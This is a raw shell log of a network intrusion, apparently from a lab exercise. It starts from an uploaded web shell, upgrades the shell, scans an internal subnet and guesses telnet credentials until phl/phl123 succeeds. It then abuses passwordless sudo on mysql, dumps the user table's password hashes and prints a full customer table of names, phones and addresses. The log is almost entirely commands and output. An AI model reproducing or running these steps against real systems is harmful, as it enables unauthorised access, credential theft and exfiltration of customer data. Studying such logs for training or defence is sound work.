
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@webserver:/var/www/html/uploads$ ls -l
ls -l
total 4
-rw-r--r-- 1 www-data www-data 2511 Feb 19 20:54 shell.php
www-data@webserver:/var/www/html/uploads$ dpkg -l | grep nmap
dpkg -l | grep nmap
ii  nmap                            7.80+dfsg1-2build1                    amd64        The Network Mapper
ii  nmap-common                     7.80+dfsg1-2build1                    all          Architecture independent files for nmap
www-data@webserver:/var/www/html/uploads$ ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 134.122.33.221  netmask 255.255.240.0  broadcast 134.122.47.255
        inet6 fe80::7813:bdff:fedc:a544  prefixlen 64  scopeid 0x20<link>
        ether 7a:13:bd:dc:a5:44  txqueuelen 1000  (Ethernet)
        RX packets 15467  bytes 126662888 (126.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8893  bytes 1436508 (1.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.1.2  netmask 255.255.255.0  broadcast 10.10.1.255
        inet6 fe80::5008:71ff:fe2c:5bb5  prefixlen 64  scopeid 0x20<link>
        ether 52:08:71:2c:5b:b5  txqueuelen 1000  (Ethernet)
        RX packets 1247  bytes 92573 (92.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6112  bytes 362226 (362.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2628  bytes 154754 (154.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2628  bytes 154754 (154.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

www-data@webserver:/var/www/html/uploads$ nmap 10.10.1.0/24 -sS 
nmap 10.10.1.0/24 -sS 
You requested a scan type which requires root privileges.
QUITTING!
www-data@webserver:/var/www/html/uploads$ nmap 10.10.1.0/24 
nmap 10.10.1.0/24 
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-19 21:59 EST
Nmap scan report for webserver (10.10.1.2)
Host is up (0.000074s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 10.10.1.3
Host is up (0.0078s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
23/tcp open  telnet

Nmap done: 256 IP addresses (2 hosts up) scanned in 2.78 seconds
www-data@webserver:/var/www/html/uploads$ telnet 10.10.1.3 
telnet 10.10.1.3 
Trying 10.10.1.3...
Connected to 10.10.1.3.
Escape character is '^]'.
Ubuntu 20.04.3 LTS
database login: admin
admin
Password: admin


Login incorrect
database login: administrator
administrator
Password: password


Login incorrect
database login: phl
phl
Password: phl


Login incorrect
database login: phl
phl
Password: phl123

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 19 22:00:18 EST 2022

  System load:  0.08              Users logged in:       1
  Usage of /:   9.7% of 24.06GB   IPv4 address for eth0: 147.182.157.9
  Memory usage: 56%               IPv4 address for eth0: 10.20.0.6
  Swap usage:   0%                IPv4 address for eth1: 10.10.1.3
  Processes:    102

14 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


*** System restart required ***
Last login: Sat Feb 19 21:30:20 EST 2022 from 10.10.1.2 on pts/3
phl@database:~$ netstat -atunp
netstat -atunp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 147.182.157.9:22        142.112.199.247:42010   ESTABLISHED -                   
tcp        0      0 10.10.1.3:23            10.10.1.2:49522         ESTABLISHED -                   
tcp        0      0 10.10.1.3:23            10.10.1.2:43492         ESTABLISHED -                   
tcp        0      0 147.182.157.9:22        142.112.199.247:42024   ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
phl@database:~$ sudo -l
sudo -l
Matching Defaults entries for phl on database:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User phl may run the following commands on database:
    (root) NOPASSWD: /usr/bin/mysql
    (root) NOPASSWD: /usr/bin/mysqldump
phl@database:~$ sudo mysql -u root -p
sudo mysql -u root -p
Enter password: 

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

No entry for terminal type "unknown";
using dumb terminal settings.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| phl                |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use mysql;
use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+------------------------------------------------------+
| Tables_in_mysql                                      |
+------------------------------------------------------+
| columns_priv                                         |
| component                                            |
| db                                                   |
| default_roles                                        |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| global_grants                                        |
| gtid_executed                                        |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| password_history                                     |
| plugin                                               |
| procs_priv                                           |
| proxies_priv                                         |
| replication_asynchronous_connection_failover         |
| replication_asynchronous_connection_failover_managed |
| replication_group_configuration_version              |
| replication_group_member_actions                     |
| role_edges                                           |
| server_cost                                          |
| servers                                              |
| slave_master_info                                    |
| slave_relay_log_info                                 |
| slave_worker_info                                    |
| slow_log                                             |
| tables_priv                                          |
| time_zone                                            |
| time_zone_leap_second                                |
| time_zone_name                                       |
| time_zone_transition                                 |
| time_zone_transition_type                            |
| user                                                 |
+------------------------------------------------------+
37 rows in set (0.00 sec)

mysql> SELECT * FROM user;
SELECT * FROM user;
+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------------------+--------------------------+----------------------------+---------------+-------------+-----------------+----------------------+-----------------------+------------------------------------------------------------------------+------------------+-----------------------+-------------------+----------------+------------------+----------------+------------------------+---------------------+--------------------------+-----------------+
| Host      | User             | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher             | x509_issuer              | x509_subject               | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                                                  | password_expired | password_last_changed | password_lifetime | account_locked | Create_role_priv | Drop_role_priv | Password_reuse_history | Password_reuse_time | Password_require_current | User_attributes |
+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------------------+--------------------------+----------------------------+---------------+-------------+-----------------+----------------------+-----------------------+------------------------------------------------------------------------+------------------+-----------------------+-------------------+----------------+------------------+----------------+------------------------+---------------------+--------------------------+-----------------+
| localhost | debian-sys-maint | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          | 0x                     | 0x                       | 0x                         |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$p7mj.fw.?./\lb.2iu0BGNIYggbef9vCLniblzYSIHLVJJ5ZQPeJtfRQDdtXVA7 | N                | 2022-02-17 22:17:33   |              NULL | N              | Y                | Y              |                   NULL |                NULL | NULL                     | NULL            |
| localhost | mysql.infoschema | Y           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          | 0x                     | 0x                       | 0x                         |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | N                | 2022-02-17 22:17:33   |              NULL | Y              | N                | N              |                   NULL |                NULL | NULL                     | NULL            |
| localhost | mysql.session    | N           | N           | N           | N           | N           | N         | N           | Y             | N            | N         | N          | N               | N          | N          | N            | Y          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          | 0x                     | 0x                       | 0x                         |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | N                | 2022-02-17 22:17:33   |              NULL | Y              | N                | N              |                   NULL |                NULL | NULL                     | NULL            |
| localhost | mysql.sys        | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          | 0x                     | 0x                       | 0x                         |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | N                | 2022-02-17 22:17:33   |              NULL | Y              | N                | N              |                   NULL |                NULL | NULL                     | NULL            |
| localhost | root             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          | 0x                     | 0x                       | 0x                         |             0 |           0 |               0 |                    0 | auth_socket           |                                                                        | N                | 2022-02-17 22:17:33   |              NULL | N              | Y                | Y              |                   NULL |                NULL | NULL                     | NULL            |
+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------------------+--------------------------+----------------------------+---------------+-------------+-----------------+----------------------+-----------------------+------------------------------------------------------------------------+------------------+-----------------------+-------------------+----------------+------------------+----------------+------------------------+---------------------+--------------------------+-----------------+
5 rows in set (0.00 sec)

mysql> use phl;
use phl;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------+
| Tables_in_phl |
+---------------+
| customers     |
+---------------+
1 row in set (0.00 sec)

mysql> SELECT * FROM customers;
SELECT * FROM customers;
+----------------+------------------------------------+------------+-----------------+------------------+--------------------+----------------------------------+--------------------------+-------------------+---------------+------------+--------------+--------------+
| customerNumber | customerName                       | customerId | contactLastName | contactFirstName | phone              | addressLine1                     | addressLine2             | city              | state         | postalCode | country      | amount_spent |
+----------------+------------------------------------+------------+-----------------+------------------+--------------------+----------------------------------+--------------------------+-------------------+---------------+------------+--------------+--------------+
|            103 | Atelier graphique                  | 1370       | Schmitt         | Carine           | 40.32.2555         | 54, rue Royale                   | NULL                     | Nantes            | NULL          | 44000      | France       | 21000.00     |
|            112 | Signal Gift Stores                 | 1166       | King            | Jean             | 7025551838         | 8489 Strong St.                  | NULL                     | Las Vegas         | NV            | 83030      | USA          | 71800.00     |
|            114 | Australian Collectors, Co.         | 1611       | Ferguson        | Peter            | 03 9520 4555       | 636 St Kilda Road                | Level 3                  | Melbourne         | Victoria      | 3004       | Australia    | 117300.00    |
|            119 | La Rochelle Gifts                  | 1370       | Labrune         | Janine           | 40.67.8555         | 67, rue des Cinquante Otages     | NULL                     | Nantes            | NULL          | 44000      | France       | 118200.00    |
|            121 | Baane Mini Imports                 | 1504       | Bergulfsen      | Jonas            | 07-98 9555         | Erling Skakkes gate 78           | NULL                     | Stavern           | NULL          | 4110       | Norway       | 81700.00     |
|            124 | Mini Gifts Distributors Ltd.       | 1165       | Nelson          | Susan            | 4155551450         | 5677 Strong St.                  | NULL                     | San Rafael        | CA            | 97562      | USA          | 210500.00    |
|            125 | Havel & Zbyszek Co                 | NULL       | Piestrzeniewicz | Zbyszek          | (26) 642-7555      | ul. Filtrowa 68                  | NULL                     | Warszawa          | NULL          | 01-012     | Poland       | 0.00         |
|            128 | Blauer See Auto, Co.               | 1504       | Keitel          | Roland           | +49 69 66 90 2555  | Lyonerstr. 34                    | NULL                     | Frankfurt         | NULL          | 60528      | Germany      | 59700.00     |
|            129 | Mini Wheels Co.                    | 1165       | Murphy          | Julie            | 6505555787         | 5557 North Pendale Street        | NULL                     | San Francisco     | CA            | 94217      | USA          | 64600.00     |
|            131 | Land of Toys Inc.                  | 1323       | Lee             | Kwai             | 2125557818         | 897 Long Airport Avenue          | NULL                     | NYC               | NY            | 10022      | USA          | 114900.00    |
|            141 | Euro+ Shopping Channel             | 1370       | Freyre          | Diego            | (91) 555 94 44     | C/ Moralzarzal, 86               | NULL                     | Madrid            | NULL          | 28034      | Spain        | 227600.00    |
|            144 | Volvo Model Replicas, Co           | 1504       | Berglund        | Christina        | 0921-12 3555       | Berguvsv..gen  8                  | NULL                     | Lule..             | NULL          | S-958 22   | Sweden       | 53100.00     |
|            145 | Danish Wholesale Imports           | 1401       | Petersen        | Jytte            | 31 12 3555         | Vinb..ltet 34                     | NULL                     | Kobenhavn         | NULL          | 1734       | Denmark      | 83400.00     |
|            146 | Saveley & Henriot, Co.             | 1337       | Saveley         | Mary             | 78.32.5555         | 2, rue du Commerce               | NULL                     | Lyon              | NULL          | 69004      | France       | 123900.00    |
|            148 | Dragon Souveniers, Ltd.            | 1621       | Natividad       | Eric             | +65 221 7555       | Bronz Sok.                       | Bronz Apt. 3/6 Tesvikiye | Singapore         | NULL          | 079903     | Singapore    | 103800.00    |
|            151 | Muscle Machine Inc                 | 1286       | Young           | Jeff             | 2125557413         | 4092 Furth Circle                | Suite 400                | NYC               | NY            | 10022      | USA          | 138500.00    |
|            157 | Diecast Classics Inc.              | 1216       | Leong           | Kelvin           | 2155551555         | 7586 Pompton St.                 | NULL                     | Allentown         | PA            | 70267      | USA          | 100600.00    |
|            161 | Technics Stores Inc.               | 1165       | Hashimoto       | Juri             | 6505556809         | 9408 Furth Circle                | NULL                     | Burlingame        | CA            | 94217      | USA          | 84600.00     |
|            166 | Handji Gifts& Co                   | 1612       | Victorino       | Wendy            | +65 224 1555       | 106 Linden Road Sandown          | 2nd Floor                | Singapore         | NULL          | 069045     | Singapore    | 97900.00     |
|            167 | Herkku Gifts                       | 1504       | Oeztan          | Veysel           | +47 2267 3215      | Brehmen St. 121                  | PR 334 Sentrum           | Bergen            | NULL          | N 5804     | Norway       | 96800.00     |
|            168 | American Souvenirs Inc             | 1286       | Franco          | Keith            | 2035557845         | 149 Spinnaker Dr.                | Suite 101                | New Haven         | CT            | 97823      | USA          | 0.00         |
|            169 | Porto Imports Co.                  | NULL       | de Castro       | Isabel           | (1) 356-5555       | Estrada da sa..de n. 58           | NULL                     | Lisboa            | NULL          | 1756       | Portugal     | 0.00         |
|            171 | Daedalus Designs Imports           | 1370       | Ranc..           | Martine          | 20.16.1555         | 184, chauss..e de Tournai         | NULL                     | Lille             | NULL          | 59000      | France       | 82900.00     |
|            172 | La Corne D'abondance, Co.          | 1337       | Bertrand        | Marie            | (1) 42.34.2555     | 265, boulevard Charonne          | NULL                     | Paris             | NULL          | 75012      | France       | 84300.00     |
|            173 | Cambridge Collectables Co.         | 1188       | Tseng           | Jerry            | 6175555555         | 4658 Baden Av.                   | NULL                     | Cambridge         | MA            | 51247      | USA          | 43400.00     |
|            175 | Gift Depot Inc.                    | 1323       | King            | Julie            | 2035552570         | 25593 South Bay Ln.              | NULL                     | Bridgewater       | CT            | 97562      | USA          | 84300.00     |
|            177 | Osaka Souveniers Co.               | 1621       | Kentary         | Mory             | +81 06 6342 5555   | 1-6-20 Dojima                    | NULL                     | Kita-ku           | Osaka         |  530-0003  | Japan        | 81200.00     |
|            181 | Vitachrome Inc.                    | 1286       | Frick           | Michael          | 2125551500         | 2678 Kingston Rd.                | Suite 101                | NYC               | NY            | 10022      | USA          | 76400.00     |
|            186 | Toys of Finland, Co.               | 1501       | Karttunen       | Matti            | 90-224 8555        | Keskuskatu 45                    | NULL                     | Helsinki          | NULL          | 21240      | Finland      | 96500.00     |
|            187 | AV Stores, Co.                     | 1501       | Ashworth        | Rachel           | (171) 555-1555     | Fauntleroy Circus                | NULL                     | Manchester        | NULL          | EC2 5NT    | UK           | 136800.00    |
|            189 | Clover Collections, Co.            | 1504       | Cassidy         | Dean             | +353 1862 1555     | 25 Maiden Lane                   | Floor No. 4              | Dublin            | NULL          | 2          | Ireland      | 69400.00     |
|            198 | Auto-Moto Classics Inc.            | 1216       | Taylor          | Leslie           | 6175558428         | 16780 Pompton St.                | NULL                     | Brickhaven        | MA            | 58339      | USA          | 23000.00     |
|            201 | UK Collectables, Ltd.              | 1501       | Devon           | Elizabeth        | (171) 555-2282     | 12, Berkeley Gardens Blvd        | NULL                     | Liverpool         | NULL          | WX1 6LT    | UK           | 92700.00     |
|            202 | Canadian Gift Exchange Network     | 1323       | Tamuri          | Yoshi            | (604) 555-3392     | 1900 Oak St.                     | NULL                     | Vancouver         | BC            | V3F 2K1    | Canada       | 90300.00     |
|            204 | Online Mini Collectables           | 1188       | Barajas         | Miguel           | 6175557555         | 7635 Spinnaker Dr.               | NULL                     | Brickhaven        | MA            | 58339      | USA          | 68700.00     |
|            205 | Toys4GrownUps.com                  | 1166       | Young           | Julie            | 6265557265         | 78934 Hillside Dr.               | NULL                     | Pasadena          | CA            | 90003      | USA          | 90700.00     |
|            206 | Asian Shopping Network, Co         | NULL       | Walker          | Brydey           | +612 9411 1555     | Suntec Tower Three               | 8 Temasek                | Singapore         | NULL          | 038988     | Singapore    | 0.00         |
|            209 | Mini Caravy                        | 1370       | Citeaux         | Fr..d..rique       | 88.60.1555         | 24, place Kl..ber                 | NULL                     | Strasbourg        | NULL          | 67000      | France       | 53800.00     |
|            211 | King Kong Collectables, Co.        | 1621       | Gao             | Mike             | +852 2251 1555     | Bank of China Tower              | 1 Garden Road            | Central Hong Kong | NULL          | NULL       | Hong Kong    | 58600.00     |
|            216 | Enaco Distributors                 | 1702       | Saavedra        | Eduardo          | (93) 203 4555      | Rambla de Catalu..a, 23           | NULL                     | Barcelona         | NULL          | 08022      | Spain        | 60300.00     |
|            219 | Boards & Toys Co.                  | 1166       | Young           | Mary             | 3105552373         | 4097 Douglas Av.                 | NULL                     | Glendale          | CA            | 92561      | USA          | 11000.00     |
|            223 | Nat..rlich Autos                    | NULL       | Kloss           | Horst            | 0372-555188        | Taucherstra..e 10                 | NULL                     | Cunewalde         | NULL          | 01307      | Germany      | 0.00         |
|            227 | Heintze Collectables               | 1401       | Ibsen           | Palle            | 86 21 3555         | Smagsloget 45                    | NULL                     | ..rhus             | NULL          | 8200       | Denmark      | 120800.00    |
|            233 | Qu..bec Home Shopping Network       | 1286       | Fresni..re       | Jean             | (514) 555-8054     | 43 rue St. Laurent               | NULL                     | Montr..al          | Qu..bec        | H1J 1C3    | Canada       | 48700.00     |
|            237 | ANG Resellers                      | NULL       | Camino          | Alejandra        | (91) 745 6555      | Gran V..a, 1                      | NULL                     | Madrid            | NULL          | 28001      | Spain        | 0.00         |
|            239 | Collectable Mini Designs Co.       | 1166       | Thompson        | Valarie          | 7605558146         | 361 Furth Circle                 | NULL                     | San Diego         | CA            | 91217      | USA          | 105000.00    |
|            240 | giftsbymail.co.uk                  | 1501       | Bennett         | Helen            | (198) 555-8888     | Garden House                     | Crowther Way 23          | Cowes             | Isle of Wight | PO31 7PJ   | UK           | 93900.00     |
|            242 | Alpha Cognac                       | 1370       | Roulet          | Annette          | 61.77.6555         | 1 rue Alsace-Lorraine            | NULL                     | Toulouse          | NULL          | 31000      | France       | 61100.00     |
|            247 | Messner Shopping Network           | NULL       | Messner         | Renate           | 069-0555984        | Magazinweg 7                     | NULL                     | Frankfurt         | NULL          | 60528      | Germany      | 0.00         |
|            249 | Amica Models & Co.                 | 1401       | Accorti         | Paolo            | 011-4988555        | Via Monte Bianco 34              | NULL                     | Torino            | NULL          | 10100      | Italy        | 113000.00    |
|            250 | Lyon Souveniers                    | 1337       | Da Silva        | Daniel           | +33 1 46 62 7555   | 27 rue du Colonel Pierre Avia    | NULL                     | Paris             | NULL          | 75508      | France       | 68100.00     |
|            256 | Auto Associ..s & Cie.               | 1370       | Tonini          | Daniel           | 30.59.8555         | 67, avenue de l'Europe           | NULL                     | Versailles        | NULL          | 78000      | France       | 77900.00     |
|            259 | Toms Spezialit..ten, Ltd            | 1504       | Pfalzheim       | Henriette        | 0221-5554327       | Mehrheimerstr. 369               | NULL                     | K..ln              | NULL          | 50739      | Germany      | 120400.00    |
|            260 | Royal Canadian Collectables, Ltd.  | 1323       | Lincoln         | Elizabeth        | (604) 555-4555     | 23 Tsawassen Blvd.               | NULL                     | Tsawassen         | BC            | T2F 8M4    | Canada       | 89600.00     |
|            273 | Franken Gifts, Co                  | NULL       | Franken         | Peter            | 089-0877555        | Berliner Platz 43                | NULL                     | M..nchen           | NULL          | 80805      | Germany      | 0.00         |
|            276 | Anna's Decorations, Ltd            | 1611       | O'Hara          | Anna             | 02 9936 8555       | 201 Miller Street                | Level 15                 | North Sydney      | NSW           | 2060       | Australia    | 107800.00    |
|            278 | Rovelli Gifts                      | 1401       | Rovelli         | Giovanni         | 035-640555         | Via Ludovico il Moro 22          | NULL                     | Bergamo           | NULL          | 24100      | Italy        | 119600.00    |
|            282 | Souveniers And Things Co.          | 1611       | Huxley          | Adrian           | +61 2 9495 8555    | Monitor Money Building           | 815 Pacific Hwy          | Chatswood         | NSW           | 2067       | Australia    | 93300.00     |
|            286 | Marta's Replicas Co.               | 1216       | Hernandez       | Marta            | 6175558555         | 39323 Spinnaker Dr.              | NULL                     | Cambridge         | MA            | 51247      | USA          | 123700.00    |
|            293 | BG&E Collectables                  | NULL       | Harrison        | Ed               | +41 26 425 50 01   | Rte des Arsenaux 41              | NULL                     | Fribourg          | NULL          | 1700       | Switzerland  | 0.00         |
|            298 | Vida Sport, Ltd                    | 1702       | Holz            | Mihael           | 0897-034555        | Grenzacherweg 237                | NULL                     | Gen..ve            | NULL          | 1203       | Switzerland  | 141300.00    |
|            299 | Norway Gifts By Mail, Co.          | 1504       | Klaeboe         | Jan              | +47 2212 1555      | Drammensveien 126A               | PB 211 Sentrum           | Oslo              | NULL          | N 0106     | Norway       | 95100.00     |
|            303 | Schuyler Imports                   | NULL       | Schuyler        | Bradley          | +31 20 491 9555    | Kingsfordweg 151                 | NULL                     | Amsterdam         | NULL          | 1043 GR    | Netherlands  | 0.00         |
|            307 | Der Hund Imports                   | NULL       | Andersen        | Mel              | 030-0074555        | Obere Str. 57                    | NULL                     | Berlin            | NULL          | 12209      | Germany      | 0.00         |
|            311 | Oulu Toy Supplies, Inc.            | 1501       | Koskitalo       | Pirkko           | 981-443655         | Torikatu 38                      | NULL                     | Oulu              | NULL          | 90110      | Finland      | 90500.00     |
|            314 | Petit Auto                         | 1401       | Dewey           | Catherine        | (02) 5554 67       | Rue Joseph-Bens 532              | NULL                     | Bruxelles         | NULL          | B-1180     | Belgium      | 79900.00     |
|            319 | Mini Classics                      | 1323       | Frick           | Steve            | 9145554562         | 3758 North Pendale Street        | NULL                     | White Plains      | NY            | 24067      | USA          | 102700.00    |
|            320 | Mini Creations Ltd.                | 1188       | Huang           | Wing             | 5085559555         | 4575 Hillside Dr.                | NULL                     | New Bedford       | MA            | 50553      | USA          | 94500.00     |
|            321 | Corporate Gift Ideas Co.           | 1165       | Brown           | Julie            | 6505551386         | 7734 Strong St.                  | NULL                     | San Francisco     | CA            | 94217      | USA          | 105000.00    |
|            323 | Down Under Souveniers, Inc         | 1612       | Graham          | Mike             | +64 9 312 5555     | 162-164 Grafton Road             | Level 2                  | Auckland          | NULL          | NULL       | New Zealand  | 88000.00     |
|            324 | Stylish Desk Decors, Co.           | 1501       | Brown           | Ann              | (171) 555-0297     | 35 King George                   | NULL                     | London            | NULL          | WX3 6FW    | UK           | 77000.00     |
|            328 | Tekni Collectables Inc.            | 1323       | Brown           | William          | 2015559350         | 7476 Moss Rd.                    | NULL                     | Newark            | NJ            | 94019      | USA          | 43000.00     |
|            333 | Australian Gift Network, Co        | 1611       | Calaghan        | Ben              | 61-7-3844-6555     | 31 Duncan St. West End           | NULL                     | South Brisbane    | Queensland    | 4101       | Australia    | 51600.00     |
|            334 | Suominen Souveniers                | 1501       | Suominen        | Kalle            | +358 9 8045 555    | Software Engineering Center      | SEC Oy                   | Espoo             | NULL          | FIN-02271  | Finland      | 98800.00     |
|            335 | Cramer Spezialit..ten, Ltd          | NULL       | Cramer          | Philip           | 0555-09555         | Maubelstr. 90                    | NULL                     | Brandenburg       | NULL          | 14776      | Germany      | 0.00         |
|            339 | Classic Gift Ideas, Inc            | 1188       | Cervantes       | Francisca        | 2155554695         | 782 First Street                 | NULL                     | Philadelphia      | PA            | 71270      | USA          | 81100.00     |
|            344 | CAF Imports                        | 1702       | Fernandez       | Jesus            | +34 913 728 555    | Merchants House                  | 27-30 Merchant's Quay    | Madrid            | NULL          | 28023      | Spain        | 59600.00     |
|            347 | Men 'R' US Retailers, Ltd.         | 1166       | Chandler        | Brian            | 2155554369         | 6047 Douglas Av.                 | NULL                     | Los Angeles       | CA            | 91003      | USA          | 57700.00     |
|            348 | Asian Treasures, Inc.              | NULL       | McKenna         | Patricia         | 2967 555           | 8 Johnstown Road                 | NULL                     | Cork              | Co. Cork      | NULL       | Ireland      | 0.00         |
|            350 | Marseille Mini Autos               | 1337       | Lebihan         | Laurence         | 91.24.4555         | 12, rue des Bouchers             | NULL                     | Marseille         | NULL          | 13008      | France       | 65000.00     |
|            353 | Reims Collectables                 | 1337       | Henriot         | Paul             | 26.47.1555         | 59 rue de l'Abbaye               | NULL                     | Reims             | NULL          | 51100      | France       | 81100.00     |
|            356 | SAR Distributors, Co               | NULL       | Kuger           | Armand           | +27 21 550 3555    | 1250 Pretorius Street            | NULL                     | Hatfield          | Pretoria      | 0028       | South Africa | 0.00         |
|            357 | GiftsForHim.com                    | 1612       | MacKinlay       | Wales            | 64-9-3763555       | 199 Great North Road             | NULL                     | Auckland          | NULL          | NULL       | New Zealand  | 77700.00     |
|            361 | Kommission Auto                    | NULL       | Josephs         | Karin            | 0251-555259        | Luisenstr. 48                    | NULL                     | M..nster           | NULL          | 44087      | Germany      | 0.00         |
|            362 | Gifts4AllAges.com                  | 1216       | Yoshido         | Juri             | 6175559555         | 8616 Spinnaker Dr.               | NULL                     | Boston            | MA            | 51003      | USA          | 41900.00     |
|            363 | Online Diecast Creations Co.       | 1216       | Young           | Dorothy          | 6035558647         | 2304 Long Airport Avenue         | NULL                     | Nashua            | NH            | 62005      | USA          | 114200.00    |
|            369 | Lisboa Souveniers, Inc             | NULL       | Rodriguez       | Lino             | (1) 354-2555       | Jardim das rosas n. 32           | NULL                     | Lisboa            | NULL          | 1675       | Portugal     | 0.00         |
|            376 | Precious Collectables              | 1702       | Urs             | Braun            | 0452-076555        | Hauptstr. 29                     | NULL                     | Bern              | NULL          | 3012       | Switzerland  | 0.00         |
|            379 | Collectables For Less Inc.         | 1188       | Nelson          | Allen            | 6175558555         | 7825 Douglas Av.                 | NULL                     | Brickhaven        | MA            | 58339      | USA          | 70700.00     |
|            381 | Royale Belge                       | 1401       | Cartrain        | Pascale          | (071) 23 67 2555   | Boulevard Tirou, 255             | NULL                     | Charleroi         | NULL          | B-6000     | Belgium      | 23500.00     |
|            382 | Salzburg Collectables              | 1401       | Pipps           | Georg            | 6562-9555          | Geislweg 14                      | NULL                     | Salzburg          | NULL          | 5020       | Austria      | 71700.00     |
|            385 | Cruz & Sons Co.                    | 1621       | Cruz            | Arnold           | +63 2 555 3587     | 15 McCallum Street               | NatWest Center #13-03    | Makati City       | NULL          | 1227 MM    | Philippines  | 81500.00     |
|            386 | L'ordine Souveniers                | 1401       | Moroni          | Maurizio         | 0522-556555        | Strada Provinciale 124           | NULL                     | Reggio Emilia     | NULL          | 42100      | Italy        | 121400.00    |
